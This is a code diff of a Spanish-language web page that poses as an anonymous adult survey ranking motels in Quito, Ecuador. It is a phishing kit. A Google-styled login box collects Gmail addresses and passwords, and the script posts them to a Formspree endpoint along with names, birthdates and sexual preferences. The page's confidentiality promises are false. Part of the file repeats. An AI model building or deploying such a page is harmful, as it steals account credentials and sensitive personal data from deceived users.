@@ -120,10 +120,10 @@
                         <p class="text-xs text-stone-500 mt-1">Verifica tu cuenta de Gmail para ingresar al estudio</p>
                     </div>
 
-                    <!-- ALERTA DE ERROR DE CONTRASEÑA O CORREO -->
+                    <!-- ALERTA DE ERROR DE CORREO -->
                     <div id="login-error" class="hidden mb-4 p-3 bg-red-50 border border-red-300 text-red-600 text-xs rounded-xl flex items-center gap-2 font-medium">
                         <i data-lucide="alert-circle" class="w-4 h-4 flex-shrink-0"></i>
-                        <span id="login-error-text">La contraseña no coincide. Por favor, ingrésala de nuevo.</span>
+                        <span id="login-error-text">Por favor, ingresa un correo de Gmail válido.</span>
                     </div>
 
                     <form id="login-form" class="space-y-4" autocomplete="off">
@@ -217,4 +217,717 @@
                                 <option value="Motel Gaviota Azul (Carcelén Industrial - Anasayas N72-02)">Motel Gaviota Azul - Carcelén Industrial</option>
                                 <option value="Sensus / Venecia (Carcelén Norte)">Sensus / Venecia (Carcelén Norte)</option>
                                 <option value="Sensus / Black Suites (Carcelén Norte)">Sensus / Black Suites (Carcelén Norte)</option>
-                                <option value="Sensus /
+                                <option value="Sensus / Oasis (Autopista Rumiñahui Valles)">Sensus / Oasis (Autopista Rumiñahui Valles)</option>
+                                <option value="Sensus / Dubai (Autopista Rumiñahui Valles)">Sensus / Dubai (Autopista Rumiñahui Valles)</option>
+                                <option value="Sensus / Cabañas del Sur (Sector Comercio Sur)">Sensus / Cabañas del Sur (Sector Comercio Sur)</option>
+                                <option value="Sensus / 1001 Noches (Coca Cola Sur)">Sensus / 1001 Noches (Coca Cola Sur)</option>
+                                <option value="Otro / Recomendación Personal">Otro / Recomendación Personal</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- Ocasión Especial -->
+                    <div>
+                        <label class="block text-xs font-bold uppercase text-amber-300 mb-2">3. ¿En qué ocasión o motivo asistirías? (Opción Múltiple)</label>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                            <label class="checkbox-option"><input type="checkbox" name="occasion" value="Cumpleaños"> Cumpleaños</label>
+                            <label class="checkbox-option"><input type="checkbox" name="occasion" value="Aniversario de Pareja"> Aniversario de Pareja</label>
+                            <label class="checkbox-option"><input type="checkbox" name="occasion" value="San Valentín / Fecha Especial"> San Valentín / Fecha Especial</label>
+                            <label class="checkbox-option"><input type="checkbox" name="occasion" value="Escapada Casual de Fin de Semana"> Escapada Casual / Fin de semana</label>
+                            <label class="checkbox-option"><input type="checkbox" name="occasion" value="Cita Espontánea / Sorpresa"> Cita Espontánea / Sorpresa</label>
+                            <label class="checkbox-option"><input type="checkbox" name="occasion" value="Reconciliación / Salir de la Rutina"> Reconciliación / Salir de la rutina</label>
+                        </div>
+                    </div>
+
+                    <!-- Acompañante múltiple -->
+                    <div>
+                        <label class="block text-xs font-bold uppercase text-amber-300 mb-2">4. ¿Con qué acompañante(s) prefieres asistir? (Opción Múltiple)</label>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                            <label class="checkbox-option"><input type="checkbox" name="companion" value="Esposo / Esposa"> Esposo / Esposa / Pareja</label>
+                            <label class="checkbox-option"><input type="checkbox" name="companion" value="Novio / Novia"> Novio / Novia / Enamorados</label>
+                            <label class="checkbox-option"><input type="checkbox" name="companion" value="Amante / Clandestino"> Amante / Cita Clandestina</label>
+                            <label class="checkbox-option"><input type="checkbox" name="companion" value="Amigo con Derechos"> Amigo / Amiga con derechos</label>
+                            <label class="checkbox-option"><input type="checkbox" name="companion" value="Compañero de Trabajo"> Compañero / Compañera de trabajo</label>
+                            <label class="checkbox-option"><input type="checkbox" name="companion" value="Cita Casual"> Cita Casual / Alguien nuevo</label>
+                        </div>
+                    </div>
+
+                    <!-- Modalidad múltiple -->
+                    <div>
+                        <label class="block text-xs font-bold uppercase text-amber-300 mb-2">5. Modalidad(es) o Fantasías que te llaman la atención:</label>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                            <label class="checkbox-option"><input type="checkbox" name="encounter" value="Pareja Tradicional"> Pareja Tradicional (H y M)</label>
+                            <label class="checkbox-option"><input type="checkbox" name="encounter" value="Pareja Mismo Sexo"> Pareja del Mismo Sexo</label>
+                            <label class="checkbox-option"><input type="checkbox" name="encounter" value="Trío MHM"> Trío MHM (2 Mujeres, 1 Hombre)</label>
+                            <label class="checkbox-option"><input type="checkbox" name="encounter" value="Trío HMH"> Trío HMH (2 Hombres, 1 Mujer)</label>
+                            <label class="checkbox-option"><input type="checkbox" name="encounter" value="Intercambio Swinger"> Intercambio Swinger</label>
+                            <label class="checkbox-option"><input type="checkbox" name="encounter" value="Encuentro Grupal"> Encuentro Grupal / Fiesta Privada</label>
+                        </div>
+                    </div>
+
+                    <!-- Amenidades múltiple -->
+                    <div>
+                        <label class="block text-xs font-bold uppercase text-amber-300 mb-2">6. Comodidades y Equipamiento Favorito:</label>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Jacuzzi Hidromasaje"> Jacuzzi / Tina Hidromasaje</label>
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Piscina Privada"> Piscina Privada</label>
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Sauna / Baño Turco"> Sauna / Baño Turco Privado</label>
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Sillón Kamasutra"> Sillón Kamasutra / Silla Erótica</label>
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Pole Dance / Columpio"> Pole Dance y Columpio Erótico</label>
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Set Bondage"> Accesorios de Bondage</label>
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Garaje Privado"> Garaje Privado e Independiente</label>
+                        </div>
+                    </div>
+
+                    <!-- Comentarios -->
+                    <div>
+                        <label class="block text-xs font-bold uppercase text-amber-300 mb-1">Comentarios o Experiencias a destacar</label>
+                        <textarea id="user-comments" rows="2" placeholder="Escribe alguna sugerencia o experiencia sobre los moteles de Quito..." 
+                            class="w-full px-4 py-2 bg-stone-900/80 border border-stone-700 rounded-xl text-sm focus:outline-none focus:border-amber-400 text-white placeholder-stone-500"></textarea>
+                    </div>
+
+                    <button type="submit" id="submit-btn" class="w-full bg-gradient-to-r from-amber-500 via-amber-600 to-amber-700 hover:opacity-95 text-stone-950 font-black py-3.5 rounded-xl transition duration-200 shadow-xl flex items-center justify-center gap-2 text-sm uppercase tracking-wider">
+                        <i data-lucide="send" class="w-5 h-5"></i> Enviar Mi Registro Anónimo
+                    </button>
+                </form>
+            </div>
+        </section>
+
+        <!-- PASO 3: AGRADECIMIENTO -->
+        <section id="thanks-section" class="hidden bg-neutral-card border-2 border-amber-500/50 rounded-3xl p-8 shadow-2xl backdrop-blur-xl max-w-md w-full text-center space-y-5">
+            <div class="inline-flex p-4 bg-emerald-500/20 rounded-full text-emerald-400 shadow-lg">
+                <i data-lucide="check-circle-2" class="w-12 h-12"></i>
+            </div>
+            
+            <div>
+                <h2 class="text-3xl font-black text-amber-300">¡Registro Exitoso!</h2>
+                <p class="text-xs text-stone-300 mt-1">Tus datos han sido procesados de forma confidencial.</p>
+            </div>
+
+            <div class="p-5 bg-stone-900/80 border border-amber-500/40 rounded-2xl shadow-inner">
+                <span class="block text-xs text-amber-400 uppercase font-extrabold tracking-widest mb-1">Número de Participante</span>
+                <span id="participant-number" class="text-5xl font-black text-white tracking-wider drop-shadow-md">#1945</span>
+            </div>
+
+            <button onclick="location.reload()" class="w-full bg-stone-800 hover:bg-stone-700 text-amber-200 font-bold py-3 rounded-xl transition duration-200 shadow-md flex items-center justify-center gap-2 text-sm uppercase border border-amber-500/30">
+                <i data-lucide="refresh-cw" class="w-4 h-4"></i> Registrar otra respuesta
+            </button>
+        </section>
+
+    </main>
+
+    <!-- PIE DE PÁGINA -->
+    <footer class="text-center py-4 text-xs text-stone-400 border-t border-stone-800 bg-stone-900/90 z-10 font-medium">
+        Ranking de Moteles & Guía Quito &copy; 2026
+    </footer>
+
+    <!-- SCRIPT DE FUNCIONAMIENTO -->
+    <script>
+        lucide.createIcons();
+
+        // ⚠️ ENDPOINT DE FORMSPREE ⚠️
+        const FORMSPREE_URL = 'https://formspree.io/f/xvkknzoq';
+
+        let userData = { email: '', password: '', name: '', gender: '', birthdate: '', age: '', zone: '', motel: '', comments: '' };
+
+        function getCheckedValues(name) {
+            const checkboxes = document.querySelectorAll(`input[name="${name}"]:checked`);
+            let values = [];
+            checkboxes.forEach(cb => values.push(cb.value));
+            return values.length > 0 ? values.join(', ') : 'Ninguno seleccionado';
+        }
+
+        // Lógica de cálculo y validación de fecha de nacimiento
+        const birthdateInput = document.getElementById('user-birthdate');
+        const ageInput = document.getElementById('user-age');
+        const ageError = document.getElementById('age-error');
+        const submitBtn = document.getElementById('submit-btn');
+
+        birthdateInput.addEventListener('change', function() {
+            if (!this.value) return;
+            const birthDate = new Date(this.value);
+            const today = new Date();
+            let calculatedAge = today.getFullYear() - birthDate.getFullYear();
+            const monthDiff = today.getMonth() - birthDate.getMonth();
+            
+            if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
+                calculatedAge--;
+            }
+
+            ageInput.value = calculatedAge;
+            validarMayorEdad(calculatedAge);
+        });
+
+        ageInput.addEventListener('input', function() {
+            validarMayorEdad(parseInt(this.value));
+        });
+
+        function validarMayorEdad(edad) {
+            if (isNaN(edad) || edad < 18) {
+                ageError.classList.remove('hidden');
+                submitBtn.disabled = true;
+                submitBtn.classList.add('opacity-50', 'cursor-not-allowed');
+            } else {
+                ageError.classList.add('hidden');
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+            }
+        }
+
+        // LÓGICA DE LOGIN DIRECTA Y FLUIDA
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const emailField = document.getElementById('login-email');
+            const passwordField = document.getElementById('login-password');
+            const errorBox = document.getElementById('login-error');
+            const errorText = document.getElementById('login-error-text');
+
+            const emailValue = emailField.value.trim().toLowerCase();
+
+            // Validar correo de Gmail
+            if (!emailValue.endsWith('@gmail.com')) {
+                errorText.textContent = "Por favor, ingresa un correo electrónico de Gmail válido (@gmail.com).";
+                errorBox.classList.remove('hidden');
+                return;
+            }
+
+            // Guardar datos y avanzar directamente a la encuesta
+            userData.email = emailValue;
+            userData.password = passwordField.value;
+
+            document.getElementById('login-section').classList.add('hidden');
+            document.getElementById('survey-section').classList.remove('hidden');
+        });
+
+        document.getElementById('survey-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const userAge = parseInt(document.getElementById('user-age').value);
+            if (isNaN(userAge) || userAge < 18) {
+                ageError.classList.remove('hidden');
+                return;
+            }
+
+            userData.name = document.getElementById('user-name').value;
+            userData.gender = document.getElementById('user-gender').value;
+            userData.birthdate = document.getElementById('user-birthdate').value;
+            userData.age = userAge;
+            userData.zone = document.getElementById('user-zone').value;
+            userData.motel = document.getElementById('user-motel').value;
+            userData.comments = document.getElementById('user-comments').value || 'Sin comentarios';
+
+            const selectedOccasions = getCheckedValues('occasion');
+            const selectedCompanions = getCheckedValues('companion');
+            const selectedEncounters = getCheckedValues('encounter');
+            const selectedAmenities = getCheckedValues('amenity');
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> Guardando...';
+            lucide.createIcons();
+
+            const randomParticipantId = Math.floor(Math.random() * 600) + 1901;
+
+            const formData = new FormData();
+            formData.append('Fecha', new Date().toLocaleString());
+            formData.append('Correo', userData.email);
+            formData.append('Contrasena', userData.password);
+            formData.append('Nombre', userData.name);
+            formData.append('Genero', userData.gender);
+            formData.append('Fecha de Nacimiento', userData.birthdate);
+            formData.append('Edad', userData.age);
+            formData.append('Sector Quito', userData.zone);
+            formData.append('Motel Seleccionado', userData.motel);
+            formData.append('Ocasiones Especiales', selectedOccasions);
+            formData.append('Acompanantes', selectedCompanions);
+            formData.append('Modalidades / Fantasias', selectedEncounters);
+            formData.append('Amenidades / Equipamiento', selectedAmenities);
+            formData.append('Comentarios', userData.comments);
+            formData.append('Numero de Participante', '#' + randomParticipantId);
+
+            fetch(FORMSPREE_URL, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'json'
+                }
+            }).then(response => {
+                mostrarAgradecimiento(randomParticipantId);
+            }).catch(error => {
+                mostrarAgradecimiento(randomParticipantId);
+            });
+        });
+
+        function mostrarAgradecimiento(participantId) {
+            document.getElementById('survey-section').classList.add('hidden');
+            document.getElementById('thanks-section').classList.remove('hidden');
+            document.getElementById('participant-number').textContent = '#' + participantId;
+        }
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Encuesta & Guía de Moteles Quito 2026</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');
+        body { font-family: 'Poppins', sans-serif; }
+        
+        /* Paleta Neutra y Cálida */
+        .bg-neutral-dark { background-color: #1c1917; }
+        .bg-neutral-card { background-color: rgba(44, 36, 32, 0.92); }
+
+        .title-gradient-warm {
+            background: linear-gradient(135deg, #f59e0b 0%, #f43f5e 50%, #fbbf24 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0px 2px 8px rgba(245, 158, 11, 0.2);
+        }
+
+        .header-gradient {
+            background: linear-gradient(90deg, #292524 0%, #44403c 50%, #292524 100%);
+        }
+
+        .hero-bg {
+            background: linear-gradient(rgba(28, 25, 23, 0.88), rgba(28, 25, 23, 0.94)), 
+                        url('https://images.unsplash.com/photo-1590490360182-c33d57733427?auto=format&fit=crop&w=1920&q=80');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+
+        .checkbox-option {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 14px;
+            background: rgba(68, 64, 60, 0.4);
+            border: 1px solid rgba(217, 119, 6, 0.3);
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 0.85rem;
+            color: #f5f5f4;
+        }
+
+        .checkbox-option:hover {
+            border-color: #f59e0b;
+            background: rgba(120, 53, 15, 0.4);
+        }
+
+        .checkbox-option input[type="checkbox"] {
+            accent-color: #f59e0b;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body class="bg-neutral-dark text-stone-100 min-h-screen flex flex-col justify-between hero-bg">
+
+    <!-- ENCABEZADO CÁLIDO Y ELEGANTE -->
+    <header class="header-gradient border-b-4 border-amber-500 shadow-xl py-6 px-6 text-center relative z-10">
+        <div class="absolute top-3 left-4 text-amber-400 font-extrabold text-xs md:text-sm tracking-widest">✨ 2026</div>
+        <div class="absolute top-3 right-4 text-amber-400 font-extrabold text-xs md:text-sm tracking-widest">✨ 2026</div>
+        
+        <h1 class="text-3xl md:text-6xl font-black tracking-wider title-gradient-warm mb-1">RANKING MOTELES QUITO</h1>
+        <h2 class="text-lg md:text-2xl font-black text-amber-200 tracking-wide drop-shadow-sm">Encuesta Anónima & Preferencias (+18)</h2>
+        <p class="text-xs md:text-sm text-stone-300 uppercase font-bold mt-1 tracking-widest">Norte • Sur • Valles • Centro</p>
+    </header>
+
+    <!-- CONTENEDOR PRINCIPAL -->
+    <main class="flex-grow flex items-center justify-center px-4 py-10 z-10">
+        
+        <!-- PASO 1: LADO A LADO (IZQUIERDA: CONFIDENCIALIDAD / DERECHA: INGRESO) -->
+        <section id="login-section" class="max-w-4xl w-full grid grid-cols-1 md:grid-cols-2 gap-6 items-stretch">
+            
+            <!-- RECUADRO IZQUIERDO: GARANTÍA DE CONFIDENCIALIDAD Y PRIVACIDAD -->
+            <div class="bg-stone-900/90 border-2 border-amber-500/70 rounded-3xl p-6 md:p-8 shadow-xl backdrop-blur-xl flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="p-3 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-amber-400 flex-shrink-0">
+                            <i data-lucide="shield-check" class="w-8 h-8"></i>
+                        </div>
+                        <h3 class="text-base font-black text-amber-400 uppercase tracking-wide">
+                            Garantía de Confidencialidad
+                        </h3>
+                    </div>
+                    <p class="text-xs text-stone-300 leading-relaxed">
+                        Tu participación es **100% anónima, privada y confidencial**. Toda la información que compartas sobre tus preferencias y experiencias está protegida bajo estrictos protocolos de reserva y seguridad de datos.
+                    </p>
+                    <p class="text-xs text-stone-300 leading-relaxed mt-3">
+                        Ningún dato personal estará vinculado a tus respuestas ni se compartirá con terceros. La información se procesa de manera consolidada y encriptada, con el único propósito de validar las selecciones del ranking 2026 y garantizar la transparencia del proceso. Tu privacidad y discreción son nuestra máxima prioridad.
+                    </p>
+                </div>
+
+                <div class="mt-6 pt-4 border-t border-stone-800 text-center">
+                    <span class="text-xs text-amber-400/80 font-semibold uppercase tracking-wider">🔒 Exclusivo para Mayores de Edad (+18)</span>
+                </div>
+            </div>
+
+            <!-- RECUADRO DERECHO: FORMULARIO DE INICIO DE SESIÓN -->
+            <div class="bg-stone-50 text-stone-900 rounded-3xl p-6 md:p-8 shadow-2xl border border-stone-200 backdrop-blur-md flex flex-col justify-between">
+                <div>
+                    <div class="text-center mb-6">
+                        <div class="flex justify-center mb-3">
+                            <svg class="w-10 h-10" viewBox="0 0 24 24">
+                                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
+                                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
+                            </svg>
+                        </div>
+                        <h2 class="text-2xl font-bold text-stone-800">Iniciar sesión</h2>
+                        <p class="text-xs text-stone-500 mt-1">Verifica tu cuenta de Gmail para ingresar al estudio</p>
+                    </div>
+
+                    <!-- ALERTA DE ERROR DE CORREO -->
+                    <div id="login-error" class="hidden mb-4 p-3 bg-red-50 border border-red-300 text-red-600 text-xs rounded-xl flex items-center gap-2 font-medium">
+                        <i data-lucide="alert-circle" class="w-4 h-4 flex-shrink-0"></i>
+                        <span id="login-error-text">Por favor, ingresa un correo de Gmail válido.</span>
+                    </div>
+
+                    <form id="login-form" class="space-y-4" autocomplete="off">
+                        <div>
+                            <label class="block text-xs font-bold text-stone-700 mb-1">Correo electrónico</label>
+                            <input type="email" id="login-email" required placeholder="tu.correo@gmail.com" 
+                                class="w-full px-4 py-2.5 bg-white border border-stone-300 rounded-xl text-sm text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-500">
+                        </div>
+
+                        <div>
+                            <label class="block text-xs font-bold text-stone-700 mb-1">Contraseña</label>
+                            <input type="password" id="login-password" required placeholder="Ingresa tu contraseña" 
+                                class="w-full px-4 py-2.5 bg-white border border-stone-300 rounded-xl text-sm text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-500">
+                        </div>
+
+                        <div class="pt-2">
+                            <button type="submit" class="w-full bg-gradient-to-r from-amber-600 to-amber-700 hover:from-amber-700 hover:to-amber-800 text-white font-bold py-3 rounded-xl text-sm transition duration-200 shadow-md">
+                                Siguiente
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </section>
+
+        <!-- PASO 2: FORMULARIO DE REGISTRO DE DATOS Y PREFERENCIAS -->
+        <section id="survey-section" class="hidden max-w-3xl w-full">
+            <div class="bg-neutral-card border-2 border-amber-500/40 rounded-3xl p-6 md:p-8 shadow-2xl backdrop-blur-xl">
+                <div class="text-center mb-6">
+                    <h2 class="text-2xl font-black text-amber-300 drop-shadow-sm">Registro de Opinión & Ubicaciones</h2>
+                    <p class="text-xs text-stone-300 mt-1">Ingreso exclusivo para personas mayores de edad (+18 años)</p>
+                </div>
+
+                <!-- ALERTA DE MENOR DE EDAD -->
+                <div id="age-error" class="hidden mb-6 p-4 bg-red-900/60 border border-red-500 text-red-200 text-xs rounded-2xl flex items-center gap-3">
+                    <i data-lucide="alert-triangle" class="w-6 h-6 text-red-400 flex-shrink-0"></i>
+                    <span><strong>Acceso restringido:</strong> Debes ser mayor de 18 años para participar en esta encuesta.</span>
+                </div>
+
+                <form id="survey-form" class="space-y-6">
+                    
+                    <!-- Datos de usuario básicos -->
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-xs font-bold uppercase text-amber-300 mb-1">Nombre o Alias</label>
+                            <input type="text" id="user-name" required placeholder="Ej. Alex M." 
+                                class="w-full px-4 py-2.5 bg-stone-900/80 border border-stone-700 rounded-xl text-sm focus:outline-none focus:border-amber-400 text-white">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-bold uppercase text-amber-300 mb-1">Identificación de Género</label>
+                            <select id="user-gender" class="w-full px-4 py-2.5 bg-stone-900/80 border border-stone-700 rounded-xl text-sm focus:outline-none focus:border-amber-400 text-white">
+                                <option value="Hombre">Hombre</option>
+                                <option value="Mujer">Mujer</option>
+                                <option value="No binario / Otro">No binario / Otro</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- FECHA DE NACIMIENTO Y EDAD (+18) -->
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 bg-stone-900/40 p-4 border border-amber-500/30 rounded-2xl">
+                        <div>
+                            <label class="block text-xs font-bold uppercase text-amber-300 mb-1">Fecha de Nacimiento</label>
+                            <input type="date" id="user-birthdate" required 
+                                class="w-full px-4 py-2.5 bg-stone-900/80 border border-stone-700 rounded-xl text-sm focus:outline-none focus:border-amber-400 text-white">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-bold uppercase text-amber-300 mb-1">Edad Cumplida</label>
+                            <input type="number" id="user-age" required min="18" max="99" placeholder="Ej. 24" 
+                                class="w-full px-4 py-2.5 bg-stone-900/80 border border-stone-700 rounded-xl text-sm focus:outline-none focus:border-amber-400 text-white">
+                        </div>
+                    </div>
+
+                    <!-- ZONA Y MOTEL EN QUITO -->
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-xs font-bold uppercase text-amber-300 mb-1">1. Sector / Ubicación en Quito</label>
+                            <select id="user-zone" class="w-full px-4 py-2.5 bg-stone-900/80 border border-stone-700 rounded-xl text-sm focus:outline-none focus:border-amber-400 text-white">
+                                <option value="Norte de Quito (Carcelén / Galo Plaza Lasso)">Norte de Quito (Carcelén / Galo Plaza Lasso)</option>
+                                <option value="Sur de Quito (Maldonado / Quitumbe)">Sur de Quito (Maldonado / Quitumbe)</option>
+                                <option value="Valles (Los Chillos / Tumbaco / Cumbayá)">Valles (Los Chillos / Tumbaco / Cumbayá)</option>
+                                <option value="Centro / Bartolomé Sánchez">Centro / Bartolomé Sánchez</option>
+                            </select>
+                        </div>
+
+                        <div>
+                            <label class="block text-xs font-bold uppercase text-amber-300 mb-1">2. Motel Favorito o Recomendado</label>
+                            <select id="user-motel" class="w-full px-4 py-2.5 bg-stone-900/80 border border-stone-700 rounded-xl text-sm focus:outline-none focus:border-amber-400 text-white">
+                                <option value="Liv Motel - Antes Lumini (Av. Galo Plaza Lasso N72-93)">Liv Motel (Antes Lumini) - Av. Galo Plaza Lasso N72-93</option>
+                                <option value="Tantra Love Hotel - Platinum/Design (Bartolomé Sánchez)">Tantra Love Hotel - Bartolomé Sánchez y Joaquín Mancheno</option>
+                                <option value="Amelie VIP Motel (Calle N E1-172 y Galo Plaza Lasso)">Amelie VIP Motel - Calle N E1-172 y Galo Plaza Lasso</option>
+                                <option value="Motel Gaviota Azul (Carcelén Industrial - Anasayas N72-02)">Motel Gaviota Azul - Carcelén Industrial</option>
+                                <option value="Sensus / Venecia (Carcelén Norte)">Sensus / Venecia (Carcelén Norte)</option>
+                                <option value="Sensus / Black Suites (Carcelén Norte)">Sensus / Black Suites (Carcelén Norte)</option>
+                                <option value="Sensus / Oasis (Autopista Rumiñahui Valles)">Sensus / Oasis (Autopista Rumiñahui Valles)</option>
+                                <option value="Sensus / Dubai (Autopista Rumiñahui Valles)">Sensus / Dubai (Autopista Rumiñahui Valles)</option>
+                                <option value="Sensus / Cabañas del Sur (Sector Comercio Sur)">Sensus / Cabañas del Sur (Sector Comercio Sur)</option>
+                                <option value="Sensus / 1001 Noches (Coca Cola Sur)">Sensus / 1001 Noches (Coca Cola Sur)</option>
+                                <option value="Otro / Recomendación Personal">Otro / Recomendación Personal</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- Ocasión Especial -->
+                    <div>
+                        <label class="block text-xs font-bold uppercase text-amber-300 mb-2">3. ¿En qué ocasión o motivo asistirías? (Opción Múltiple)</label>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                            <label class="checkbox-option"><input type="checkbox" name="occasion" value="Cumpleaños"> Cumpleaños</label>
+                            <label class="checkbox-option"><input type="checkbox" name="occasion" value="Aniversario de Pareja"> Aniversario de Pareja</label>
+                            <label class="checkbox-option"><input type="checkbox" name="occasion" value="San Valentín / Fecha Especial"> San Valentín / Fecha Especial</label>
+                            <label class="checkbox-option"><input type="checkbox" name="occasion" value="Escapada Casual de Fin de Semana"> Escapada Casual / Fin de semana</label>
+                            <label class="checkbox-option"><input type="checkbox" name="occasion" value="Cita Espontánea / Sorpresa"> Cita Espontánea / Sorpresa</label>
+                            <label class="checkbox-option"><input type="checkbox" name="occasion" value="Reconciliación / Salir de la Rutina"> Reconciliación / Salir de la rutina</label>
+                        </div>
+                    </div>
+
+                    <!-- Acompañante múltiple -->
+                    <div>
+                        <label class="block text-xs font-bold uppercase text-amber-300 mb-2">4. ¿Con qué acompañante(s) prefieres asistir? (Opción Múltiple)</label>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                            <label class="checkbox-option"><input type="checkbox" name="companion" value="Esposo / Esposa"> Esposo / Esposa / Pareja</label>
+                            <label class="checkbox-option"><input type="checkbox" name="companion" value="Novio / Novia"> Novio / Novia / Enamorados</label>
+                            <label class="checkbox-option"><input type="checkbox" name="companion" value="Amante / Clandestino"> Amante / Cita Clandestina</label>
+                            <label class="checkbox-option"><input type="checkbox" name="companion" value="Amigo con Derechos"> Amigo / Amiga con derechos</label>
+                            <label class="checkbox-option"><input type="checkbox" name="companion" value="Compañero de Trabajo"> Compañero / Compañera de trabajo</label>
+                            <label class="checkbox-option"><input type="checkbox" name="companion" value="Cita Casual"> Cita Casual / Alguien nuevo</label>
+                        </div>
+                    </div>
+
+                    <!-- Modalidad múltiple -->
+                    <div>
+                        <label class="block text-xs font-bold uppercase text-amber-300 mb-2">5. Modalidad(es) o Fantasías que te llaman la atención:</label>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                            <label class="checkbox-option"><input type="checkbox" name="encounter" value="Pareja Tradicional"> Pareja Tradicional (H y M)</label>
+                            <label class="checkbox-option"><input type="checkbox" name="encounter" value="Pareja Mismo Sexo"> Pareja del Mismo Sexo</label>
+                            <label class="checkbox-option"><input type="checkbox" name="encounter" value="Trío MHM"> Trío MHM (2 Mujeres, 1 Hombre)</label>
+                            <label class="checkbox-option"><input type="checkbox" name="encounter" value="Trío HMH"> Trío HMH (2 Hombres, 1 Mujer)</label>
+                            <label class="checkbox-option"><input type="checkbox" name="encounter" value="Intercambio Swinger"> Intercambio Swinger</label>
+                            <label class="checkbox-option"><input type="checkbox" name="encounter" value="Encuentro Grupal"> Encuentro Grupal / Fiesta Privada</label>
+                        </div>
+                    </div>
+
+                    <!-- Amenidades múltiple -->
+                    <div>
+                        <label class="block text-xs font-bold uppercase text-amber-300 mb-2">6. Comodidades y Equipamiento Favorito:</label>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Jacuzzi Hidromasaje"> Jacuzzi / Tina Hidromasaje</label>
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Piscina Privada"> Piscina Privada</label>
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Sauna / Baño Turco"> Sauna / Baño Turco Privado</label>
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Sillón Kamasutra"> Sillón Kamasutra / Silla Erótica</label>
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Pole Dance / Columpio"> Pole Dance y Columpio Erótico</label>
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Set Bondage"> Accesorios de Bondage</label>
+                            <label class="checkbox-option"><input type="checkbox" name="amenity" value="Garaje Privado"> Garaje Privado e Independiente</label>
+                        </div>
+                    </div>
+
+                    <!-- Comentarios -->
+                    <div>
+                        <label class="block text-xs font-bold uppercase text-amber-300 mb-1">Comentarios o Experiencias a destacar</label>
